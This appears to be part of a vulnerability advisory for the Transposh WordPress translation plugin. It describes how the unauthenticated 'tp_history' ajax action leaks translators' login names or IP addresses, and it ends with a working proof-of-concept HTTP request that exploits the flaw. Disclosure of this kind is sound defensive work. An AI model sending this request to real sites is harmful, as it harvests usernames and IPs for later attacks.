RCE Security.


3. VERSIONS AFFECTED
====================
Transposh WordPress Translation 1.0.8.1 and below


4. INTRODUCTION
===============
Transposh translation filter for WordPress offers a unique approach to blog
translation. It allows your blog to combine automatic translation with human
translation aided by your users with an easy to use in-context interface.

(from the vendor's homepage)


5. VULNERABILITY DETAILS
========================
Transposh offers an ajax action called "tp_history" which is intended to return
data about who has translated a text given by the "token" parameter. However, the
plugin also returns the user's login name as part of the "user_login" attribute.

Successful exploits can allow an unauthenticated attacker to leak the WordPress
username of translators. If an anonymous user submitted the translation, then the
user's IP address is returned.


6. PROOF OF CONCEPT
===================
The following Proof-of-Concept returns the information of the translated text
"Calendly URL":

POST /wp-admin/admin-ajax.php HTTP/1.1
Host: [host]
Content-Length: 36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0
Connection: close

action=tp_history&token=Calendly%20URL&lang=en
